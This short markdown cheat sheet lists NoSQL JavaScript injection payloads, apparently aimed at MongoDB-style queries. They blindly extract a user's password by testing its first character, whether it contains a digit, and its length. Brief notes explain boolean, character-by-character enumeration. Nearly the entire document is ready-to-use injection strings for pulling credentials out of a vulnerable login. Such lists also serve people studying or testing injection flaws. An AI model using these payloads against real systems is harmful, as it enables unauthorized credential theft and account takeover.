# Data Extraction Payloads

## Password Character

```text
admin' && this.password[0] == 'a' || 'a'=='b
```

---

## Password Contains Digit

```text
admin' && this.password.match(/\d/) || 'a'=='b
```

---

## Password Length

```text
administrator' && this.password.length < 30 || 'a'=='b
```

---

# Purpose

Extract sensitive information using boolean JavaScript expressions.

---

# Key Takeaways

- Character-by-character extraction relies on true and false responses.
- Password length should be determined before enumerating characters.